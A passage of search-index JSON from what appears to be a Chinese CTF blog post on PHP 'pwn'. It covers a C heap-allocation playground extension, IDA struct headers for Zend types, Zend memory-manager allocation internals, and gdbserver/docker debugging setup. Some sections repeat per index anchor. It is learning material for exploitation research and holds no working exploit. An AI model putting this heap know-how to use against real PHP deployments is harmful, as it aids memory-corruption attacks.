(size_t) strtoull(s, NULL, 10); } } /* 添加新分配记录 */ static size_t add_allocation(void *ptr, size_t size) { if (!playground_state.initialized) return SIZE_MAX; if (playground_state.count + 1 \u003e playground_state.capacity) { size_t newcap = playground_state.capacity * 2; allocation_t *newalloc = erealloc( playground_state.allocations, sizeof(allocation_t) * newcap ); if (!newalloc) return SIZE_MAX; playground_state.allocations = newalloc; playground_state.capacity = newcap; } playground_state.allocations[playground_state.count].ptr = ptr; playground_state.allocations[playground_state.count].size = size; return playground_state.count++; } /* 核心交互函数 */ PHP_FUNCTION(emalloc_playground) { ZEND_PARSE_PARAMETERS_NONE(); if (!playground_state.initialized) { php_error(E_WARNING, \"Playground not initialized\"); RETURN_FALSE; } pid_t pid = getpid(); php_printf(\"=== PHP emalloc Playground ===\\n\"); php_printf(\"PID: %d\\n\", (int)pid); php_printf(\"Type 'help' for commands\\n\"); char linebuf[512]; while (1) { php_printf(\"\u003e \"); if (fgets(linebuf, sizeof(linebuf), stdin) == NULL) { php_printf(\"\\nExit: EOF received\\n\"); break; } string_trim(linebuf); if (linebuf[0] == '\\0') continue; char *cmd = strtok(linebuf, \" \\t\"); if (!cmd) continue; if (strcmp(cmd, \"exit\") == 0 || strcmp(cmd, \"quit\") == 0) { php_printf(\"Exiting playground\\n\"); break; } else if (strcmp(cmd, \"pid\") == 0) { php_printf(\"Process ID: %d\\n\", (int)pid); } else if (strcmp(cmd, \"emalloc\") == 0 ||strcmp(cmd, \"malloc\") == 0) { char *arg = strtok(NULL, \" \\t\"); size_t sz = parse_size_string(arg); if (sz == 0) { php_printf(\"Error: Size must be \u003e 0\\n\"); continue; } void *p = emalloc(sz); memset(p, 0xCC, sz); // 填充测试模式 size_t idx = add_allocation(p, sz); if (idx == SIZE_MAX) { php_printf(\"Error: Failed to store allocation\\n\"); efree(p); continue; } php_printf(\"[%zu] Allocated %zu bytes at 0x%\" PRIxPTR \"\\n\", idx, sz, (uintptr_t)p); } else if (strcmp(cmd, \"calloc\") == 0) { char *arg1 = strtok(NULL, \" \\t\"); char *arg2 = strtok(NULL, \" \\t\"); size_t nm = parse_size_string(arg1); size_t sz = parse_size_string(arg2); if (nm == 0 || sz == 0) { php_printf(\"Error: Invalid calloc parameters\\n\"); continue; } size_t total_size; if (__builtin_mul_overflow(nm, sz, \u0026total_size)) { php_printf(\"Error: Size overflow\\n\"); continue; } void *p = ecalloc(nm, sz); size_t idx = add_allocation(p, t","date":"2026-02-02","objectID":"/posts/phppwn_note/:2:2","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#emalloc_playground"},{"categories":["pwn"],"collections":null,"content":"ida逆向\r在phppwn逆向的时候，常遇到类似这样的东西： 其实它是对传入参数的类型进行判断，但是看起来不太直观 IDA中支持导入C头文件，修复一些结构体 修复后： if ( v15-\u003eu1.v.type == IS_ARRAY ) { if ( v16-\u003eu1.v.type == IS_STRING ) { 导入方式：File -\u003e Load file -\u003e Parse C header file，然后选择这个头文件导入。 导入后就能看到Local Types中有相关的结构体 使用方式： 右键需要convert的变量，选择Convert to struct *...，其中常用的结构体有：zval、string、array 至于相关变量结构体改成类似IS_ARRAY。右键需要改的数字，选择Enum，选择zend_type zval类型还需要额外设置union类型 //php_struct.h //定义基本类型 typedef unsigned char uint8_t; typedef unsigned short uint16_t; typedef unsigned int uint32_t; typedef unsigned long long uint64_t; typedef long long int64_t; typedef unsigned char zend_uchar; typedef long long zend_long; typedef unsigned long zend_ulong; //zval.u1.type类型 typedef enum { IS_NULL = 0, IS_FALSE = 1, IS_TRUE = 2, IS_LONG = 4, IS_DOUBLE = 5, IS_STRING = 6, IS_ARRAY = 7, IS_OBJECT = 8, IS_RESOURCE = 9, IS_REFERENCE = 10, IS_CONSTANT = 11, IS_CONSTANT_AS = 12, _IS_BOOL = 13, IS_CALLABLE = 14, IS_INDIRECT = 15, IS_PTR = 17 } zend_type; //前置声明 typedef struct _zval_struct zval; typedef struct _zend_array HashTable; typedef struct _zend_string zend_string; typedef struct _zend_object zend_object; typedef struct _zend_resource zend_resource; typedef struct _Bucket Bucket; typedef void (*dtor_func_t)(zval *pDest); typedef struct _zend_reference zend_reference; typedef struct _zend_ast_ref zend_ast_ref; typedef struct _zend_object_handlers zend_object_handlers; typedef struct _zend_class_entry zend_class_entry; typedef union _zend_function zend_function; typedef struct _zend_refcounted_v zend_refcounted_v; //zend_refcounted_h typedef struct _zend_refcounted_v { uint8_t type; uint8_t flags; uint16_t gc_info; } zend_refcounted_v; typedef union _zend_refcounted_u { zend_refcounted_v v; uint32_t type_info; } zend_refcounted_u; typedef struct _zend_refcounted_h { uint32_t refcount; zend_refcounted_u u; } zend_refcounted_h; //_zend_string typedef struct _zend_string { zend_refcounted_h gc; // 8字节 uint64_t h; // 8字节 uint32_t len; // 4字节 char val[1]; // 1字节（+3字节padding，对齐到8） }string; typedef struct _zval_u1_v { uint8_t type; uint8_t type_flags; uint8_t const_flags; uint8_t reserved; } zval_u1_v; typedef union _zval_u1 { zval_u1_v v; uint32_t type_info; } zval_u1; typedef union _zval_u2 { uint32_t var_flags; uint32_t next; uint32_t cache_slot; uint32_t lineno; uint32_t num_args; uint32_t fe_pos; } zval_u2; //这里一些对象使用void*避免具体类型 typedef union _zend_value { zend_long lval; double dval; void *counted; zend_string *str; HashTable *arr; zend_object *obj; zend_resource *res; zend_reference *ref; zend_ast_ref *ast; _zval_struct *zv; void *ptr; zend_class_entry *ce; zend_function *func; struct { uint32_t w1; uint32_t w2; } ww; } zend_value; typedef struct _zval_struct { zend_value value; // 8字节 zval_u1 u1; // 4字节 zval_u2 u2; // 4字节 }zval; //_zend_array typedef struct _Bucket { _zval_struct val; zend_ulong h; _zend_string *key; }Bucket; typedef struct _zend_array_v { zend_uchar flags; zend_uchar nApplyCount; zend_uchar nIteratorsCount; zend_uchar reserve; }_zend_array_v; typedef union _zend_array_u { _zend_array_v v; uint32_t flag; }_zend_array_u; typedef struct _zend_array { zend_refcounted_h gc; //8字节 _zend_array_u u; uint32_t nTableMask; Bucket *arData; uint32_t nNumUsed; uint32_t nNumOfElements; uint32_t nTableSize; uint32_t nInternalPointer; zend_long nNextFreeElement; dtor_func_t pDestructor; }HashTable; //_zend_resource typedef struct _zend_resource { zend_refcounted_h gc; int handle; int type; void *ptr; }zend_resource; //_zend_object typedef struct _zend_object { zend_refcounted_h gc; uint32_t handle; zend_class_entry *ce; const zend_object_handlers *handlers; HashTable *properties; _zval_struct properties_table[1]; }zend_object; typedef _zend_array array; ","date":"2026-02-02","objectID":"/posts/phppwn_note/:2:3","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#ida逆向"},{"categories":["pwn"],"collections":null,"content":"php堆内存管理\r基本数据结构\rstruct _zend_mm_heap { #if ZEND_MM_STAT size_t size; //当前已用内存数 size_t peak; //内存单次申请的峰值 #endif zend_mm_free_slot *free_slot[ZEND_MM_BINS]; // 小内存分配的可用位置链表，ZEND_MM_BINS等于30，即此数组表示的是各种大小内存对应的链表头部 ... zend_mm_huge_list *huge_list; //大内存链表 zend_mm_chunk *main_chunk; //指向chunk链表头部 zend_mm_chunk *cached_chunks; //缓存的chunk链表 int chunks_count; //已分配chunk数 int peak_chunks_count; //当前request使用chunk峰值 int cached_chunks_count; //缓存的chunk数 double avg_chunks_count; //chunk使用均值，每次请求结束后会根据peak_chunks_count重新计算：(avg_chunks_count+peak_chunks_count)/2.0 } struct _zend_mm_chunk { zend_mm_heap *heap; //指向heap zend_mm_chunk *next; //指向下一个chunk zend_mm_chunk *prev; //指向上一个chunk int free_pages; //当前chunk的剩余page数 int free_tail; /* number of free pages at the end of chunk */ int num; char reserve[64 - (sizeof(void*) * 3 + sizeof(int) * 3)]; zend_mm_heap heap_slot; //heap结构，只有主chunk会用到 zend_mm_page_map free_map; //标识各page是否已分配的bitmap数组，总大小512bit，对应page总数，每个page占一个bit位 zend_mm_page_info map[ZEND_MM_PAGES]; //各page的信息：当前page使用类型(用于large分配还是small)、占用的page数等 }; //按固定大小切好的small内存槽 struct _zend_mm_free_slot { zend_mm_free_slot *next_free_slot;//此指针只有内存未分配时用到，分配后整个结构体转为char使用 }; small内存分配\remalloc的底层函数，简化后： void *zend_mm_alloc_heap(zend_mm_heap *heap, size_t size) { void *ptr; #if ZEND_DEBUG size_t real_size = size; #endif // ---- 1. 小块分配 ---- if (size \u003c= ZEND_MM_MAX_SMALL_SIZE) { ptr = zend_mm_alloc_small(heap, size); } // ---- 2. 中等块分配 ---- else if (size \u003c= ZEND_MM_MAX_LARGE_SIZE) { ptr = zend_mm_alloc_large(heap, size); } // ---- 3. 超大块分配 ---- else { ptr = zend_mm_alloc_huge(heap, size); } return ptr; } 可以看出php申请的堆块根据大小分三种：small、large、huge 其中 #define ZEND_MM_MIN_SMALL_SIZE 8 #define ZEND_MM_MAX_SMALL_SIZE 3072 //3KB #define ZEND_MM_MAX_LARGE_SIZE (ZEND_MM_CHUNK_SIZE - (ZEND_MM_PAGE_SIZE * ZEND_MM_FIRST_PAGE)) 小于3KB-\u003esmall 大于3KB，小于2044KB(511 page_size)，不是512个page是因为第一个page用于存储_zend_mm_heap结构体 大于2MB-\u003ehuge zend_mm_alloc_small\rstatic zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC) { ZEND_ASSERT(bin_data_size[bin_num] \u003e= ZEND_MM_MIN_USEABLE_BIN_SIZE); #if ZEND_MM_STAT do { size_t size = heap-\u003esize + bin_data_size[bin_num]; size_t peak = MAX(heap-\u003epeak, size); heap-\u003esize = size; heap-\u003epeak = peak; } while (0); #endif if (EXPECTED(heap-\u003efree_slot[bin_num] != NULL)) { zend_mm_free_slot *p = heap-\u003efree_slot[bin_num]; heap-\u003efree_slot[bin_num] = zend_mm_get_next_free_slot(heap, bin_num, p); return p; } else { return zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC); } } 相应size的free_slot中有堆块就从free_slot中取第一个，并更新free_slot链表头 static zend_always_inline zend_mm_free_slot *zend_mm_get_next_free_slot(zend_mm_heap *heap, uint32_t bin_num, zend_mm_free_slot* slot) { zend_mm_free_slot *next = slot-\u003enext_free_slot; if (EXPECTED(next != NULL)) { zend_mm_free_slot *shadow = ZEND_MM_FREE_SLOT_PTR_SHADOW(slot, bin_num); if (UNEXPECTED(next != zend_mm_decode_free_slot(heap, shadow))) { zend_mm_panic(\"zend_mm_heap corrupted\"); } } return (zend_mm_free_slot*)next; } 没有的话就执行**zend_mm_alloc_small_slow**，这个函数： 向堆申请新的页 将页分成多个小块，返回第一个小块 其他块链入相应的slot ","date":"2026-02-02","objectID":"/posts/phppwn_note/:2:4","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#php堆内存管理"},{"categories":["pwn"],"collections":null,"content":"php堆内存管理\r基本数据结构\rstruct _zend_mm_heap { #if ZEND_MM_STAT size_t size; //当前已用内存数 size_t peak; //内存单次申请的峰值 #endif zend_mm_free_slot *free_slot[ZEND_MM_BINS]; // 小内存分配的可用位置链表，ZEND_MM_BINS等于30，即此数组表示的是各种大小内存对应的链表头部 ... zend_mm_huge_list *huge_list; //大内存链表 zend_mm_chunk *main_chunk; //指向chunk链表头部 zend_mm_chunk *cached_chunks; //缓存的chunk链表 int chunks_count; //已分配chunk数 int peak_chunks_count; //当前request使用chunk峰值 int cached_chunks_count; //缓存的chunk数 double avg_chunks_count; //chunk使用均值，每次请求结束后会根据peak_chunks_count重新计算：(avg_chunks_count+peak_chunks_count)/2.0 } struct _zend_mm_chunk { zend_mm_heap *heap; //指向heap zend_mm_chunk *next; //指向下一个chunk zend_mm_chunk *prev; //指向上一个chunk int free_pages; //当前chunk的剩余page数 int free_tail; /* number of free pages at the end of chunk */ int num; char reserve[64 - (sizeof(void*) * 3 + sizeof(int) * 3)]; zend_mm_heap heap_slot; //heap结构，只有主chunk会用到 zend_mm_page_map free_map; //标识各page是否已分配的bitmap数组，总大小512bit，对应page总数，每个page占一个bit位 zend_mm_page_info map[ZEND_MM_PAGES]; //各page的信息：当前page使用类型(用于large分配还是small)、占用的page数等 }; //按固定大小切好的small内存槽 struct _zend_mm_free_slot { zend_mm_free_slot *next_free_slot;//此指针只有内存未分配时用到，分配后整个结构体转为char使用 }; small内存分配\remalloc的底层函数，简化后： void *zend_mm_alloc_heap(zend_mm_heap *heap, size_t size) { void *ptr; #if ZEND_DEBUG size_t real_size = size; #endif // ---- 1. 小块分配 ---- if (size \u003c= ZEND_MM_MAX_SMALL_SIZE) { ptr = zend_mm_alloc_small(heap, size); } // ---- 2. 中等块分配 ---- else if (size \u003c= ZEND_MM_MAX_LARGE_SIZE) { ptr = zend_mm_alloc_large(heap, size); } // ---- 3. 超大块分配 ---- else { ptr = zend_mm_alloc_huge(heap, size); } return ptr; } 可以看出php申请的堆块根据大小分三种：small、large、huge 其中 #define ZEND_MM_MIN_SMALL_SIZE 8 #define ZEND_MM_MAX_SMALL_SIZE 3072 //3KB #define ZEND_MM_MAX_LARGE_SIZE (ZEND_MM_CHUNK_SIZE - (ZEND_MM_PAGE_SIZE * ZEND_MM_FIRST_PAGE)) 小于3KB-\u003esmall 大于3KB，小于2044KB(511 page_size)，不是512个page是因为第一个page用于存储_zend_mm_heap结构体 大于2MB-\u003ehuge zend_mm_alloc_small\rstatic zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC) { ZEND_ASSERT(bin_data_size[bin_num] \u003e= ZEND_MM_MIN_USEABLE_BIN_SIZE); #if ZEND_MM_STAT do { size_t size = heap-\u003esize + bin_data_size[bin_num]; size_t peak = MAX(heap-\u003epeak, size); heap-\u003esize = size; heap-\u003epeak = peak; } while (0); #endif if (EXPECTED(heap-\u003efree_slot[bin_num] != NULL)) { zend_mm_free_slot *p = heap-\u003efree_slot[bin_num]; heap-\u003efree_slot[bin_num] = zend_mm_get_next_free_slot(heap, bin_num, p); return p; } else { return zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC); } } 相应size的free_slot中有堆块就从free_slot中取第一个，并更新free_slot链表头 static zend_always_inline zend_mm_free_slot *zend_mm_get_next_free_slot(zend_mm_heap *heap, uint32_t bin_num, zend_mm_free_slot* slot) { zend_mm_free_slot *next = slot-\u003enext_free_slot; if (EXPECTED(next != NULL)) { zend_mm_free_slot *shadow = ZEND_MM_FREE_SLOT_PTR_SHADOW(slot, bin_num); if (UNEXPECTED(next != zend_mm_decode_free_slot(heap, shadow))) { zend_mm_panic(\"zend_mm_heap corrupted\"); } } return (zend_mm_free_slot*)next; } 没有的话就执行**zend_mm_alloc_small_slow**，这个函数： 向堆申请新的页 将页分成多个小块，返回第一个小块 其他块链入相应的slot ","date":"2026-02-02","objectID":"/posts/phppwn_note/:2:4","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#基本数据结构"},{"categories":["pwn"],"collections":null,"content":"php堆内存管理\r基本数据结构\rstruct _zend_mm_heap { #if ZEND_MM_STAT size_t size; //当前已用内存数 size_t peak; //内存单次申请的峰值 #endif zend_mm_free_slot *free_slot[ZEND_MM_BINS]; // 小内存分配的可用位置链表，ZEND_MM_BINS等于30，即此数组表示的是各种大小内存对应的链表头部 ... zend_mm_huge_list *huge_list; //大内存链表 zend_mm_chunk *main_chunk; //指向chunk链表头部 zend_mm_chunk *cached_chunks; //缓存的chunk链表 int chunks_count; //已分配chunk数 int peak_chunks_count; //当前request使用chunk峰值 int cached_chunks_count; //缓存的chunk数 double avg_chunks_count; //chunk使用均值，每次请求结束后会根据peak_chunks_count重新计算：(avg_chunks_count+peak_chunks_count)/2.0 } struct _zend_mm_chunk { zend_mm_heap *heap; //指向heap zend_mm_chunk *next; //指向下一个chunk zend_mm_chunk *prev; //指向上一个chunk int free_pages; //当前chunk的剩余page数 int free_tail; /* number of free pages at the end of chunk */ int num; char reserve[64 - (sizeof(void*) * 3 + sizeof(int) * 3)]; zend_mm_heap heap_slot; //heap结构，只有主chunk会用到 zend_mm_page_map free_map; //标识各page是否已分配的bitmap数组，总大小512bit，对应page总数，每个page占一个bit位 zend_mm_page_info map[ZEND_MM_PAGES]; //各page的信息：当前page使用类型(用于large分配还是small)、占用的page数等 }; //按固定大小切好的small内存槽 struct _zend_mm_free_slot { zend_mm_free_slot *next_free_slot;//此指针只有内存未分配时用到，分配后整个结构体转为char使用 }; small内存分配\remalloc的底层函数，简化后： void *zend_mm_alloc_heap(zend_mm_heap *heap, size_t size) { void *ptr; #if ZEND_DEBUG size_t real_size = size; #endif // ---- 1. 小块分配 ---- if (size \u003c= ZEND_MM_MAX_SMALL_SIZE) { ptr = zend_mm_alloc_small(heap, size); } // ---- 2. 中等块分配 ---- else if (size \u003c= ZEND_MM_MAX_LARGE_SIZE) { ptr = zend_mm_alloc_large(heap, size); } // ---- 3. 超大块分配 ---- else { ptr = zend_mm_alloc_huge(heap, size); } return ptr; } 可以看出php申请的堆块根据大小分三种：small、large、huge 其中 #define ZEND_MM_MIN_SMALL_SIZE 8 #define ZEND_MM_MAX_SMALL_SIZE 3072 //3KB #define ZEND_MM_MAX_LARGE_SIZE (ZEND_MM_CHUNK_SIZE - (ZEND_MM_PAGE_SIZE * ZEND_MM_FIRST_PAGE)) 小于3KB-\u003esmall 大于3KB，小于2044KB(511 page_size)，不是512个page是因为第一个page用于存储_zend_mm_heap结构体 大于2MB-\u003ehuge zend_mm_alloc_small\rstatic zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC) { ZEND_ASSERT(bin_data_size[bin_num] \u003e= ZEND_MM_MIN_USEABLE_BIN_SIZE); #if ZEND_MM_STAT do { size_t size = heap-\u003esize + bin_data_size[bin_num]; size_t peak = MAX(heap-\u003epeak, size); heap-\u003esize = size; heap-\u003epeak = peak; } while (0); #endif if (EXPECTED(heap-\u003efree_slot[bin_num] != NULL)) { zend_mm_free_slot *p = heap-\u003efree_slot[bin_num]; heap-\u003efree_slot[bin_num] = zend_mm_get_next_free_slot(heap, bin_num, p); return p; } else { return zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC); } } 相应size的free_slot中有堆块就从free_slot中取第一个，并更新free_slot链表头 static zend_always_inline zend_mm_free_slot *zend_mm_get_next_free_slot(zend_mm_heap *heap, uint32_t bin_num, zend_mm_free_slot* slot) { zend_mm_free_slot *next = slot-\u003enext_free_slot; if (EXPECTED(next != NULL)) { zend_mm_free_slot *shadow = ZEND_MM_FREE_SLOT_PTR_SHADOW(slot, bin_num); if (UNEXPECTED(next != zend_mm_decode_free_slot(heap, shadow))) { zend_mm_panic(\"zend_mm_heap corrupted\"); } } return (zend_mm_free_slot*)next; } 没有的话就执行**zend_mm_alloc_small_slow**，这个函数： 向堆申请新的页 将页分成多个小块，返回第一个小块 其他块链入相应的slot ","date":"2026-02-02","objectID":"/posts/phppwn_note/:2:4","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#small内存分配"},{"categories":["pwn"],"collections":null,"content":"php堆内存管理\r基本数据结构\rstruct _zend_mm_heap { #if ZEND_MM_STAT size_t size; //当前已用内存数 size_t peak; //内存单次申请的峰值 #endif zend_mm_free_slot *free_slot[ZEND_MM_BINS]; // 小内存分配的可用位置链表，ZEND_MM_BINS等于30，即此数组表示的是各种大小内存对应的链表头部 ... zend_mm_huge_list *huge_list; //大内存链表 zend_mm_chunk *main_chunk; //指向chunk链表头部 zend_mm_chunk *cached_chunks; //缓存的chunk链表 int chunks_count; //已分配chunk数 int peak_chunks_count; //当前request使用chunk峰值 int cached_chunks_count; //缓存的chunk数 double avg_chunks_count; //chunk使用均值，每次请求结束后会根据peak_chunks_count重新计算：(avg_chunks_count+peak_chunks_count)/2.0 } struct _zend_mm_chunk { zend_mm_heap *heap; //指向heap zend_mm_chunk *next; //指向下一个chunk zend_mm_chunk *prev; //指向上一个chunk int free_pages; //当前chunk的剩余page数 int free_tail; /* number of free pages at the end of chunk */ int num; char reserve[64 - (sizeof(void*) * 3 + sizeof(int) * 3)]; zend_mm_heap heap_slot; //heap结构，只有主chunk会用到 zend_mm_page_map free_map; //标识各page是否已分配的bitmap数组，总大小512bit，对应page总数，每个page占一个bit位 zend_mm_page_info map[ZEND_MM_PAGES]; //各page的信息：当前page使用类型(用于large分配还是small)、占用的page数等 }; //按固定大小切好的small内存槽 struct _zend_mm_free_slot { zend_mm_free_slot *next_free_slot;//此指针只有内存未分配时用到，分配后整个结构体转为char使用 }; small内存分配\remalloc的底层函数，简化后： void *zend_mm_alloc_heap(zend_mm_heap *heap, size_t size) { void *ptr; #if ZEND_DEBUG size_t real_size = size; #endif // ---- 1. 小块分配 ---- if (size \u003c= ZEND_MM_MAX_SMALL_SIZE) { ptr = zend_mm_alloc_small(heap, size); } // ---- 2. 中等块分配 ---- else if (size \u003c= ZEND_MM_MAX_LARGE_SIZE) { ptr = zend_mm_alloc_large(heap, size); } // ---- 3. 超大块分配 ---- else { ptr = zend_mm_alloc_huge(heap, size); } return ptr; } 可以看出php申请的堆块根据大小分三种：small、large、huge 其中 #define ZEND_MM_MIN_SMALL_SIZE 8 #define ZEND_MM_MAX_SMALL_SIZE 3072 //3KB #define ZEND_MM_MAX_LARGE_SIZE (ZEND_MM_CHUNK_SIZE - (ZEND_MM_PAGE_SIZE * ZEND_MM_FIRST_PAGE)) 小于3KB-\u003esmall 大于3KB，小于2044KB(511 page_size)，不是512个page是因为第一个page用于存储_zend_mm_heap结构体 大于2MB-\u003ehuge zend_mm_alloc_small\rstatic zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC) { ZEND_ASSERT(bin_data_size[bin_num] \u003e= ZEND_MM_MIN_USEABLE_BIN_SIZE); #if ZEND_MM_STAT do { size_t size = heap-\u003esize + bin_data_size[bin_num]; size_t peak = MAX(heap-\u003epeak, size); heap-\u003esize = size; heap-\u003epeak = peak; } while (0); #endif if (EXPECTED(heap-\u003efree_slot[bin_num] != NULL)) { zend_mm_free_slot *p = heap-\u003efree_slot[bin_num]; heap-\u003efree_slot[bin_num] = zend_mm_get_next_free_slot(heap, bin_num, p); return p; } else { return zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC); } } 相应size的free_slot中有堆块就从free_slot中取第一个，并更新free_slot链表头 static zend_always_inline zend_mm_free_slot *zend_mm_get_next_free_slot(zend_mm_heap *heap, uint32_t bin_num, zend_mm_free_slot* slot) { zend_mm_free_slot *next = slot-\u003enext_free_slot; if (EXPECTED(next != NULL)) { zend_mm_free_slot *shadow = ZEND_MM_FREE_SLOT_PTR_SHADOW(slot, bin_num); if (UNEXPECTED(next != zend_mm_decode_free_slot(heap, shadow))) { zend_mm_panic(\"zend_mm_heap corrupted\"); } } return (zend_mm_free_slot*)next; } 没有的话就执行**zend_mm_alloc_small_slow**，这个函数： 向堆申请新的页 将页分成多个小块，返回第一个小块 其他块链入相应的slot ","date":"2026-02-02","objectID":"/posts/phppwn_note/:2:4","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#zend_mm_alloc_small"},{"categories":["pwn"],"collections":null,"content":"调试\rphpgdb\r调试用的这位师傅写的东西：phpdbg 这里如果执行sudo apt install php-cli-dbgsym报错可以： sudo apt update sudo apt install ubuntu-dbgsym-keyring -y sudo tee /etc/apt/sources.list.d/ddebs.list \u003c\u003c'EOF' deb http://ddebs.ubuntu.com noble main restricted universe multiverse deb http://ddebs.ubuntu.com noble-updates main restricted universe multiverse EOF sudo apt update sudo apt install php8.3-cli-dbgsym -y 这种方式只能下8.3版本的符号表，如果还要其他版本的符号表： sudo add-apt-repository ppa:ondrej/php -y sudo nvim /etc/apt/sources.list.d/ondrej-ubuntu-php-noble.sources 把Components: main修改成：Components: main main/debug 再 sudo apt update sudo apt install php8.4-cli-dbgsym 即可 容器与容器之间进行调试\r两个容器都要下载gdbserver apt-get update \u0026\u0026 apt-get install -y gdbserver 然后被连接的容器： gdbserver :8888 --args php ./exp.php 还要获取被连接容器的ip： hostname -i 172.17.0.3 然后用另一个容器去连接： gdb target remote 172.17.0.3:8888 容器与wsl2之间进行调试\r如果用wsl2去远程调试容器里的程序，wsl2里： gdb target remote localhost:7777 通过localhost连接需要容器映射端口到本地（参数-p）： $ docker run -it \\ -p 9999:9999 \\ -p 7777:7777 \\ --name d3ctf_hackphp \\ d3ctf_hackphp phpgdb支持四个命令：pheap psmall pelement pstart p alloc_globals.mm_heap ","date":"2026-02-02","objectID":"/posts/phppwn_note/:2:5","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#调试"},{"categories":["pwn"],"collections":null,"content":"调试\rphpgdb\r调试用的这位师傅写的东西：phpdbg 这里如果执行sudo apt install php-cli-dbgsym报错可以： sudo apt update sudo apt install ubuntu-dbgsym-keyring -y sudo tee /etc/apt/sources.list.d/ddebs.list \u003c\u003c'EOF' deb http://ddebs.ubuntu.com noble main restricted universe multiverse deb http://ddebs.ubuntu.com noble-updates main restricted universe multiverse EOF sudo apt update sudo apt install php8.3-cli-dbgsym -y 这种方式只能下8.3版本的符号表，如果还要其他版本的符号表： sudo add-apt-repository ppa:ondrej/php -y sudo nvim /etc/apt/sources.list.d/ondrej-ubuntu-php-noble.sources 把Components: main修改成：Components: main main/debug 再 sudo apt update sudo apt install php8.4-cli-dbgsym 即可 容器与容器之间进行调试\r两个容器都要下载gdbserver apt-get update \u0026\u0026 apt-get install -y gdbserver 然后被连接的容器： gdbserver :8888 --args php ./exp.php 还要获取被连接容器的ip： hostname -i 172.17.0.3 然后用另一个容器去连接： gdb target remote 172.17.0.3:8888 容器与wsl2之间进行调试\r如果用wsl2去远程调试容器里的程序，wsl2里： gdb target remote localhost:7777 通过localhost连接需要容器映射端口到本地（参数-p）： $ docker run -it \\ -p 9999:9999 \\ -p 7777:7777 \\ --name d3ctf_hackphp \\ d3ctf_hackphp phpgdb支持四个命令：pheap psmall pelement pstart p alloc_globals.mm_heap ","date":"2026-02-02","objectID":"/posts/phppwn_note/:2:5","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#phpgdb"},{"categories":["pwn"],"collections":null,"content":"调试\rphpgdb\r调试用的这位师傅写的东西：phpdbg 这里如果执行sudo apt install php-cli-dbgsym报错可以： sudo apt update sudo apt install ubuntu-dbgsym-keyring -y sudo tee /etc/apt/sources.list.d/ddebs.list \u003c\u003c'EOF' deb http://ddebs.ubuntu.com noble main restricted universe multiverse deb http://ddebs.ubuntu.com noble-updates main restricted universe multiverse EOF sudo apt update sudo apt install php8.3-cli-dbgsym -y 这种方式只能下8.3版本的符号表，如果还要其他版本的符号表： sudo add-apt-repository ppa:ondrej/php -y sudo nvim /etc/apt/sources.list.d/ondrej-ubuntu-php-noble.sources 把Components: main修改成：Components: main main/debug 再 sudo apt update sudo apt install php8.4-cli-dbgsym 即可 容器与容器之间进行调试\r两个容器都要下载gdbserver apt-get update \u0026\u0026 apt-get install -y gdbserver 然后被连接的容器： gdbserver :8888 --args php ./exp.php 还要获取被连接容器的ip： hostname -i 172.17.0.3 然后用另一个容器去连接： gdb target remote 172.17.0.3:8888 容器与wsl2之间进行调试\r如果用wsl2去远程调试容器里的程序，wsl2里： gdb target remote localhost:7777 通过localhost连接需要容器映射端口到本地（参数-p）： $ docker run -it \\ -p 9999:9999 \\ -p 7777:7777 \\ --name d3ctf_hackphp \\ d3ctf_hackphp phpgdb支持四个命令：pheap psmall pelement pstart p alloc_globals.mm_heap ","date":"2026-02-02","objectID":"/posts/phppwn_note/:2:5","tags":null,"title":"Phppwn笔记","uri":"/posts/phppwn_note/#容器与容器之间进行调试"},{"categories":["pwn"],"collections":null,"content":"调试\rphpgdb\r调试用的这位师傅写的东西：phpdbg 这里如果执行sudo apt install php-cli-dbgsym报错可以： sudo apt update sudo apt install ubuntu-dbgsym-keyring -y sudo tee /etc/apt/sources.list.d/ddebs.list \u003c\u003c'EOF' deb http://ddebs.ubuntu.com noble main restricted universe multiverse deb http://ddebs.ubuntu.com noble-updates main restricted universe multiverse EOF sudo apt update sudo apt install php8.3-cli-dbgsym -y 这种方式只能下8.3版本的符号表，如果还要其他版本的符号表： sudo add-apt-repository ppa:ondrej/php -y sudo nvim /etc/apt/sources.list.d/ondrej-ubuntu-php-noble.sources 把Components: main修改成：Components: main main/debug 再 sudo apt update sudo apt install php8.4-cli-dbgsym 即可 容器与容器之间进行调试\r两个容器都要下载gdbserver apt-get update \u0026\u0026 apt-get install -y gdbserver 然后被连接的容器： gdbserver :8888 --args php ./exp.php 还要获取被连接容器的ip： hostname -i 172.17.0.3 然后用另一个容器去连接： gdb target remote 172.17.0.3:8888 容器与wsl2之间进行调试\r如果用wsl2去远程调试容器里的程序，wsl2里： gdb target remote localhost:7777 通过localhost连接需要容器映射端口到本地（参数-p）： $ docker run -it \\ -p 9999:9999 \\ -p 7777:7777 \\ --name d3ctf_hackphp \\ d3ctf_hackphp phpgdb支持四个命令：pheap psmall pelement pstart p alloc_globals.mm_heap 